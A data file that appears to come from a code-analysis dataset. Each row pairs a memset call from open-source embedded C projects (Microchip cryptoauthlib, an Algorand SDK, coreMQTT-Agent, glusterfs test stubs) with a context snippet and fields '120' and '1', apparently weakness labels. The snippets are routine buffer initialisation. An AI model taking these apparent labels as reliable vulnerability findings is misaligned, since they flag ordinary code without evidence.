2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_privwrite.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_privwrite.c,"memset(&packet.data[36], 0, 32);",120,1,"            packet.param2 = key_id;                         // Key ID
            memcpy(&packet.data[0], priv_key, 36);          // Private key
            memset(&packet.data[36], 0, 32);                // MAC (ignored for unencrypted write)
        }
        else
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_privwrite.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_privwrite.c,"memset(&gen_dig_param, 0, sizeof(gen_dig_param));",120,1,"            // NoMac bit isn't being considered here on purpose to remove having to read SlotConfig.
            // OtherData is built to get the same result regardless of the NoMac bit.
            memset(&gen_dig_param, 0, sizeof(gen_dig_param));
            gen_dig_param.zone = GENDIG_ZONE_DATA;
            gen_dig_param.sn = serial_num;
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_privwrite.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_privwrite.c,"memset(&host_mac_param, 0, sizeof(host_mac_param));",120,1,"
            // Calculate Auth MAC and cipher text
            memset(&host_mac_param, 0, sizeof(host_mac_param));
            host_mac_param.zone = PRIVWRITE_MODE_ENCRYPT;
            host_mac_param.key_id = key_id;
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_secureboot.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_secureboot.c,"memset(&tempkey, 0, sizeof(tempkey));",120,1,"        // Setup Nonce command to create nonce combining host (num_in) and
        // device (RNG) nonces
        memset(&tempkey, 0, sizeof(tempkey));
        memset(&nonce_params, 0, sizeof(nonce_params));
        nonce_params.mode = NONCE_MODE_SEED_UPDATE;
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_secureboot.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_secureboot.c,"memset(&sboot_enc_params, 0, sizeof(sboot_enc_params));",120,1,"
        // Encrypt the digest
        memset(&sboot_enc_params, 0, sizeof(sboot_enc_params));
        sboot_enc_params.digest = digest;
        sboot_enc_params.io_key = io_key;
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_secureboot.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_secureboot.c,"memset(&sboot_mac_params, 0, sizeof(sboot_mac_params));",120,1,"
        // Prepare MAC calculator
        memset(&sboot_mac_params, 0, sizeof(sboot_mac_params));
        sboot_mac_params.mode = mode | SECUREBOOT_MODE_ENC_MAC_FLAG;
        sboot_mac_params.param2 = 0;
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_sha.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_sha.c,"memset(&ctx->block[ctx->block_size], 0, pad_zero_count + 4);",120,1,"
        // Add padding zeros plus upper 4 bytes of total message size in bits (only supporting 32bit message bit counts)
        memset(&ctx->block[ctx->block_size], 0, pad_zero_count + 4);
        ctx->block_size += pad_zero_count + 4;

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_verify.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_verify.c,"memset(&verify_mac_params, 0, sizeof(verify_mac_params));",120,1,"
        // Calculate the expected MAC
        memset(&verify_mac_params, 0, sizeof(verify_mac_params));
        verify_mac_params.mode = mode | VERIFY_MODE_SOURCE_MSGDIGBUF | VERIFY_MODE_MAC_FLAG;
        verify_mac_params.key_id = key_id;
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_write.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_write.c,"memset(public_key_formatted, 0, sizeof(public_key_formatted));",120,1,"    // | Pad: 4 Bytes | PubKey[0:27] | PubKey[28:31] | Pad: 4 Bytes | PubKey[32:55] | PubKey[56:63] |

    memset(public_key_formatted, 0, sizeof(public_key_formatted));
    memcpy(&public_key_formatted[4], &public_key[0], 32);   // Move X to padded position
    memcpy(&public_key_formatted[40], &public_key[32], 32); // Move Y to padded position
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\crypto\hashes\sha1_routines.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\crypto\hashes\sha1_routines.c,"memset(ctx->buf, 0, 64);",120,1,"    {
        shaEngine(ctx->buf, ctx->h);
        memset(ctx->buf, 0, 64);
    }

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_all_platforms_kit_hidapi.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_all_platforms_kit_hidapi.c,"memset(&_gHid, 0, sizeof(_gHid));",120,1,"
    // Initialize the _gHid structure
    memset(&_gHid, 0, sizeof(_gHid));
    for (i = 0; i < HID_DEVICES_MAX; i++)
    {
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_all_platforms_kit_hidapi.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_all_platforms_kit_hidapi.c,"memset(buffer, 0, (HID_PACKET_MAX));",120,1,"    while (bytes_left > 0)
    {
        memset(buffer, 0, (HID_PACKET_MAX));

        if (bytes_left >= cfg->atcahid.packetsize)
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_at90usb1287_i2c_asf.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_at90usb1287_i2c_asf.c,"memset(packet.data, 0x00, sizeof(packet.data));",120,1,"        discoverCfg.atcai2c.slave_address = slaveAddress << 1;  // turn it into an 8-bit address which is what the rest of the i2c HAL is expecting when a packet is sent

        memset(packet.data, 0x00, sizeof(packet.data));
        // build an info command
        packet.param1 = INFO_MODE_REVISION;
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_i2c_start.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_i2c_start.c,"memset(&packet, 0x00, sizeof(packet));",120,1,"        discoverCfg.atcai2c.slave_address = slaveAddress << 1;  // turn it into an 8-bit address which is what the rest of the i2c HAL is expecting when a packet is sent

        memset(&packet, 0x00, sizeof(packet));
        // build an info command
        packet.param1 = INFO_MODE_REVISION;
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_linux_kit_cdc.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_linux_kit_cdc.c,"memset(&_gCdc, 0, sizeof(_gCdc));",120,1,"
    // Initialize the _gCdc structure
    memset(&_gCdc, 0, sizeof(_gCdc));
    for (i = 0; i < CDC_DEVICES_MAX; i++)
    {
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_linux_kit_hid.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_linux_kit_hid.c,"memset(hid_filter, 0, sizeof(hid_filter));",120,1,"
    // Create the HID filter string
    memset(hid_filter, 0, sizeof(hid_filter));
    sprintf(hid_filter, ""vid_%04x&pid_%04x"", cfg->atcahid.vid, cfg->atcahid.pid);

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_linux_kit_hid.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_linux_kit_hid.c,"memset(device_hid, 0, sizeof(device_hid));",120,1,"
        // Create the device HID string
        memset(device_hid, 0, sizeof(device_hid));
        sprintf(device_hid, ""vid_%s&pid_%s"",
                udev_device_get_sysattr_value(device, ""idVendor""),
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_samv71_i2c_asf.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_samv71_i2c_asf.c,"memset(data, 0x00, rxlength);",120,1,"    // look for wake response
    rxlength = 4;
    memset(data, 0x00, rxlength);
    status = hal_i2c_receive(iface, data, &rxlength);

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_win_kit_cdc.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_win_kit_cdc.c,"memset(&dev_data, 0, sizeof(SP_DEVINFO_DATA));",120,1,"        {
            // Initialize the dev_data object
            memset(&dev_data, 0, sizeof(SP_DEVINFO_DATA));
            dev_data.cbSize = sizeof(SP_DEVINFO_DATA);

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_win_kit_cdc.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_win_kit_cdc.c,"memset(buffer, 0, CDC_BUFFER_MAX);",120,1,"    while (bytes_left > 0)
    {
        memset(buffer, 0, CDC_BUFFER_MAX);

        if (bytes_left >= CDC_BUFFER_MAX)
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_win_kit_hid.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_win_kit_hid.c,"memset(&dev_data, 0, sizeof(SP_DEVICE_INTERFACE_DATA));",120,1,"
    // Initialize the dev_data object
    memset(&dev_data, 0, sizeof(SP_DEVICE_INTERFACE_DATA));
    dev_data.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\kit_protocol.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\kit_protocol.c,"memset(rxbuf, 0, rxlen);",120,1,"
        rxlen = sizeof(rxbuf);
        memset(rxbuf, 0, rxlen);
        if (ATCA_SUCCESS != (status = kit_phy_receive(iface, rxbuf, &rxlen)))
        {
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\kit_protocol.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\kit_protocol.c,"memset(pkitbuf, 0, nkitbuf);",120,1,"    // Wrap in kit protocol
    pkitbuf = malloc(nkitbuf);
    memset(pkitbuf, 0, nkitbuf);
    target = kit_id_from_devtype(iface->mIfaceCFG->devtype);
    status = kit_wrap_cmd(&txdata[1], txlength, pkitbuf, &nkitbuf, target[0]);
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\kit_protocol.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\kit_protocol.c,"memset(pkitbuf, 0, sizeof(pkitbuf));",120,1,"    *rxsize = 0;

    memset(pkitbuf, 0, sizeof(pkitbuf));

    // Receive the bytes
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\kit_protocol.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\kit_protocol.c,"memset(reply, 0, replysize);",120,1,"
    // Receive the reply to wake ""00(04...)\n""
    memset(reply, 0, replysize);
    status = kit_phy_receive(iface, reply, &replysize);
    if (status != ATCA_SUCCESS)
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\kit_protocol.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\kit_protocol.c,"memset(rxdata, 0, rxsize);",120,1,"
    // Unwrap from kit protocol
    memset(rxdata, 0, rxsize);
    status = kit_parse_rsp(reply, replysize, &kitstatus, rxdata, &rxsize);

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\kit_protocol.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\kit_protocol.c,"memset(pkitcmd, 0, *nkitcmd);",120,1,"
    // Wrap in kit protocol
    memset(pkitcmd, 0, *nkitcmd);

    // Copy the prefix
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,"memset(param->p_temp, 0, 8);",120,1,"        else
        {
            memset(param->p_temp, 0, 8);                  // use 8 zeros for (6)
        }
        param->p_temp += 8;
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,"memset(param->p_temp, 0, 3);",120,1,"        param->p_temp += 8;

        memset(param->p_temp, 0, 3);                     // use 3 zeros for (7)
        param->p_temp += 3;
    }
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,"memset(param->p_temp, 0, 4);",120,1,"    else
    {
        memset(param->p_temp, 0, 4);                       //use zeros for (9)
    }
    param->p_temp += 4;
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,"memset(param->p_temp, 0, 2);",120,1,"    else
    {
        memset(param->p_temp, 0, 2);                       //use zeros for (9)
    }
    param->p_temp += 2;
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,"memset(msg, 0, sizeof(msg));",120,1,"
    // Build the message
    memset(msg, 0, sizeof(msg));
    if (param->mode & CHECKMAC_MODE_BLOCK1_TEMPKEY)
    {
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,"memset(p_temp, 0x36, HMAC_BLOCK_SIZE - ATCA_KEY_SIZE);",120,1,"    // Refer to fips-198 , length Key = 32 bytes, Block size = 512 bits = 64 bytes.
    // So the Key must be padded with zeros.
    memset(p_temp, 0x36, HMAC_BLOCK_SIZE - ATCA_KEY_SIZE);
    p_temp += HMAC_BLOCK_SIZE - ATCA_KEY_SIZE;

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,"memset(p_temp, 0, ATCA_KEY_SIZE);",120,1,"
    // Next append the stream of data 'text'
    memset(p_temp, 0, ATCA_KEY_SIZE);
    p_temp += ATCA_KEY_SIZE;

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,"memset(p_temp, 0x5C, HMAC_BLOCK_SIZE - ATCA_KEY_SIZE);",120,1,"    // Refer to fips-198 , length Key = 32 bytes, Block size = 512 bits = 64 bytes.
    // So the Key must be padded with zeros.
    memset(p_temp, 0x5C, HMAC_BLOCK_SIZE - ATCA_KEY_SIZE);
    p_temp += HMAC_BLOCK_SIZE - ATCA_KEY_SIZE;

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,"memset(p_temp, 0x00, ATCA_KEY_SIZE);",120,1,"    else if (param->zone == GENDIG_ZONE_COUNTER || param->zone == GENDIG_ZONE_KEY_CONFIG)
    {
        memset(p_temp, 0x00, ATCA_KEY_SIZE);                        // 32 bytes of zero.

    }
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,"memset(p_temp, 0x00, 20);",120,1,"        *p_temp++ = (uint8_t)(param->counter >> 24);

        memset(p_temp, 0x00, 20);                       // (7) 20 bytes of zero
        p_temp += 20;

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,"memset(p_temp, 0x00, 19);",120,1,"        *p_temp++ = param->slot_locked;                // (7) 1 byte of slot locked

        memset(p_temp, 0x00, 19);                      // (7) 19 bytes of zero
        p_temp += 19;

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,"memset(p_temp, 0, ATCA_GENDIG_ZEROS_SIZE);",120,1,"    {

        memset(p_temp, 0, ATCA_GENDIG_ZEROS_SIZE);       // (7) 25 zeros
        p_temp += ATCA_GENDIG_ZEROS_SIZE;

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,"memset(p_temp, 0, ATCA_WRITE_MAC_ZEROS_SIZE);",120,1,"
        // (7) 25 zeros
        memset(p_temp, 0, ATCA_WRITE_MAC_ZEROS_SIZE);
        p_temp += ATCA_WRITE_MAC_ZEROS_SIZE;

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,"memset(p_temp, 0, ATCA_PRIVWRITE_MAC_ZEROS_SIZE);",120,1,"
        // (7) 21 zeros
        memset(p_temp, 0, ATCA_PRIVWRITE_MAC_ZEROS_SIZE);
        p_temp += ATCA_PRIVWRITE_MAC_ZEROS_SIZE;

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\host\atca_host.c,"memset(p_temp, 0, ATCA_DERIVE_KEY_ZEROS_SIZE);",120,1,"
    // (7) 25 zeros
    memset(p_temp, 0, ATCA_DERIVE_KEY_ZEROS_SIZE);
    p_temp += ATCA_DERIVE_KEY_ZEROS_SIZE;

"
2021\c-vertices-sdk\src\account.c,Dataset Download,../../Dataset Download/2021\c-vertices-sdk\src\account.c,"memset(&m_accounts[id], 0, sizeof(account_details_t));",120,1,"    }

    memset(&m_accounts[id], 0, sizeof(account_details_t));

    LOG_INFO(""ðŸ‘› Deleted account from wallet: #%zu"", id);
"
2021\c-vertices-sdk\src\account.c,Dataset Download,../../Dataset Download/2021\c-vertices-sdk\src\account.c,"memset(m_accounts, 0, sizeof m_accounts);",120,1,"account_init()
{
    memset(m_accounts, 0, sizeof m_accounts);

    return VTC_SUCCESS;
"
2021\c-vertices-sdk\src\algorand\algorand_provider.c,Dataset Download,../../Dataset Download/2021\c-vertices-sdk\src\algorand\algorand_provider.c,"memset(version, 0, sizeof(provider_version_t));",120,1,"    if (err_code == VTC_SUCCESS)
    {
        memset(version, 0, sizeof(provider_version_t));

        cJSON *json = cJSON_Parse(rx_buf);
"
2021\c-vertices-sdk\src\algorand\algorand_provider.c,Dataset Download,../../Dataset Download/2021\c-vertices-sdk\src\algorand\algorand_provider.c,"memset(&m_provider.version, 0, sizeof m_provider.version);",120,1,"provider_init(provider_info_t *provider)
{
    memset(&m_provider.version, 0, sizeof m_provider.version);

    m_provider.provider.url = provider->url;
"
2021\c-vertices-sdk\src\algorand\algorand_transaction.c,Dataset Download,../../Dataset Download/2021\c-vertices-sdk\src\algorand\algorand_transaction.c,"memset(&m_pending_tx[bufid], 0, sizeof(signed_transaction_t));",120,1,"    }

    memset(&m_pending_tx[bufid], 0, sizeof(signed_transaction_t));

    return VTC_SUCCESS;
"
2021\c-vertices-sdk\tests\src\test_base32.cpp,Dataset Download,../../Dataset Download/2021\c-vertices-sdk\tests\src\test_base32.cpp,"memset(result, 0x00, encode_len);",120,1,"
    char result[encode_len];
    memset(result, 0x00, encode_len);

    LOG_DEBUG(""B32 encoding - Input binary len %zu, expected string len: %zu"", in_len, encode_len);
"
2021\c-vertices-sdk\tests\src\test_base32.cpp,Dataset Download,../../Dataset Download/2021\c-vertices-sdk\tests\src\test_base32.cpp,"memset(result, 0x00, decode_buf_len);",120,1,"
    char result[decode_buf_len];
    memset(result, 0x00, decode_buf_len);

    ret_code_t err_code = b32_decode(encoded_str, result, &decode_buf_len);
"
2021\c-vertices-sdk\tests\src\test_base64.cpp,Dataset Download,../../Dataset Download/2021\c-vertices-sdk\tests\src\test_base64.cpp,"memset(result, 0xA5, sizeof(result));",120,1,"    const size_t expected_size = encode_len;
    char result[encode_len];
    memset(result, 0xA5, sizeof(result));

    LOG_DEBUG(""B64 encoding - Input bin len %zu, expected str len: %zu"", in_len, encode_len);
"
2021\coreMQTT-Agent\source\core_mqtt_agent.c,Dataset Download,../../Dataset Download/2021\coreMQTT-Agent\source\core_mqtt_agent.c,"( void ) memset( pFoundAck, 0x00, sizeof( MQTTAgentAckInfo_t ) );",120,1,"                    ( unsigned short ) pFoundAck->packetId,
                    ( void * ) pFoundAck->pOriginalCommand ) );
        ( void ) memset( pFoundAck, 0x00, sizeof( MQTTAgentAckInfo_t ) );
        pFoundAck = NULL;
    }
"
2021\coreMQTT-Agent\source\core_mqtt_agent.c,Dataset Download,../../Dataset Download/2021\coreMQTT-Agent\source\core_mqtt_agent.c,"( void ) memset( pCommand, 0x00, sizeof( MQTTAgentCommand_t ) );",120,1,"    assert( pCommand != NULL );

    ( void ) memset( pCommand, 0x00, sizeof( MQTTAgentCommand_t ) );

    /* Determine if required parameters are present in context. */
"
2021\coreMQTT-Agent\source\core_mqtt_agent.c,Dataset Download,../../Dataset Download/2021\coreMQTT-Agent\source\core_mqtt_agent.c,"( void ) memset( pAckInfo, 0x00, sizeof( MQTTAgentAckInfo_t ) );",120,1,"
    /* Clear the entry from the list. */
    ( void ) memset( pAckInfo, 0x00, sizeof( MQTTAgentAckInfo_t ) );
}

"
2021\coreMQTT-Agent\source\core_mqtt_agent.c,Dataset Download,../../Dataset Download/2021\coreMQTT-Agent\source\core_mqtt_agent.c,"( void ) memset( &returnInfo, 0x00, sizeof( MQTTAgentReturnInfo_t ) );",120,1,"    MQTTAgentReturnInfo_t returnInfo;

    ( void ) memset( &returnInfo, 0x00, sizeof( MQTTAgentReturnInfo_t ) );
    assert( pAgentContext != NULL );
    assert( pAgentContext->agentInterface.releaseCommand != NULL );
"
2021\coreMQTT-Agent\source\core_mqtt_agent.c,Dataset Download,../../Dataset Download/2021\coreMQTT-Agent\source\core_mqtt_agent.c,"( void ) memset( &( pendingAcks[ i ] ), 0x00, sizeof( MQTTAgentAckInfo_t ) );",120,1,"
                /* Now remove it from the list. */
                ( void ) memset( &( pendingAcks[ i ] ), 0x00, sizeof( MQTTAgentAckInfo_t ) );
            }
        }
"
2021\coreMQTT-Agent\source\core_mqtt_agent.c,Dataset Download,../../Dataset Download/2021\coreMQTT-Agent\source\core_mqtt_agent.c,"( void ) memset( pMqttAgentContext, 0x00, sizeof( MQTTAgentContext_t ) );",120,1,"    else
    {
        ( void ) memset( pMqttAgentContext, 0x00, sizeof( MQTTAgentContext_t ) );

        returnStatus = MQTT_Init( &( pMqttAgentContext->mqttContext ),
"
2021\coreMQTT-Agent\source\core_mqtt_agent_command_functions.c,Dataset Download,../../Dataset Download/2021\coreMQTT-Agent\source\core_mqtt_agent_command_functions.c,"( void ) memset( pReturnFlags, 0x00, sizeof( MQTTAgentCommandFuncReturns_t ) );",120,1,"    assert( pReturnFlags != NULL );

    ( void ) memset( pReturnFlags, 0x00, sizeof( MQTTAgentCommandFuncReturns_t ) );
    pReturnFlags->runProcessLoop = true;

"
2021\coreMQTT-Agent\test\cbmc\stubs\core_mqtt_stubs.c,Dataset Download,../../Dataset Download/2021\coreMQTT-Agent\test\cbmc\stubs\core_mqtt_stubs.c,"( void ) memset( pContext, 0x00, sizeof( MQTTContext_t ) );",120,1,"                      ""MQTT Context is not NULL."" );

    ( void ) memset( pContext, 0x00, sizeof( MQTTContext_t ) );

    pContext->connectStatus = MQTTNotConnected;
"
2021\cslim\test\libglusterfs\call-stub.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\call-stub.cpp.c,"extern void *memset (void *__s, int __c, size_t __n) __attribute__ ((__nothrow__ , __leaf__)) __attribute__ ((__nonnull__ (1)));",120,1,"

extern void *memset (void *__s, int __c, size_t __n) __attribute__ ((__nothrow__ , __leaf__)) __attribute__ ((__nonnull__ (1)));


"
2021\cslim\test\libglusterfs\client_t.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\client_t.cpp.c,"memset(buf, 0, sizeof(buf));",120,1,"        va_list ap;

        memset(buf, 0, sizeof(buf));
        __builtin_va_start(ap,fmt);
        vsnprintf(buf, 4096, fmt, ap);
"
2021\cslim\test\libglusterfs\client_t.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\client_t.cpp.c,"memset(key, 0, sizeof key);",120,1,"                return;

        memset(key, 0, sizeof key);
        gf_proc_dump_write(""refcount"", ""%d"", client->ref.count);
}
"
2021\cslim\test\libglusterfs\client_t.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\client_t.cpp.c,"memset (key, 0, sizeof (key));",120,1,"                                prev_bound_xl = client->bound_xl;

                                memset (key, 0, sizeof (key));
                                snprintf (key, sizeof (key), ""conn%d"", count);
                                inode_table_dump_to_dict (client->bound_xl->itable,
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"memset (replies, 0, numsubvols * sizeof (*replies));",120,1,"        for (i = 0; i < numsubvols; i++)
                args_cbk_wipe (&replies[i]);
        memset (replies, 0, numsubvols * sizeof (*replies));
}

"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->fgetxattr_cbk) tmp_cbk = cluster_fgetxattr_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->fgetxattr""; _new->unwind_to = ""cluster_fgetxattr_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->fgetxattr_cbk = cluster_fgetxattr_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->fgetxattr); subvols[__i]->fops->fgetxattr (_new, subvols[__i], fd, name, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                   const char *name, dict_t *xdata)
{
